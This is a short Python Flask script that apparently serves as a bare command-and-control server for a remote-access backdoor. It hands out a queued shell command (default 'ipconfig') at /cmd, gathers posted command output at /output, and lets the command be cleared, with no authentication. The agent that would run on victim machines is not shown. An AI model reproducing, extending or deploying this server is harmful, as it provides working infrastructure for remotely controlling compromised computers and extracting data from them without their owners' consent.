from flask import Flask, request

app = Flask(__name__)
command = "ipconfig"
out = ""


@app.route("/cmd", methods=['GET', 'POST'])
def cmd():
    global command
    if request.method == 'POST':
        command = request.form['command']
    return command


@app.route("/output", methods=['GET', 'POST'])
def output():
    global out
    if request.method == 'POST':
        out = out + request.form['out'] + '\n' + '\n'
        print(out)
    return out


@app.route("/clear", methods=['GET'])
def clear():
    global command
    command = ""
    return "Command cleared"


if __name__ == "__main__":
    app.run()

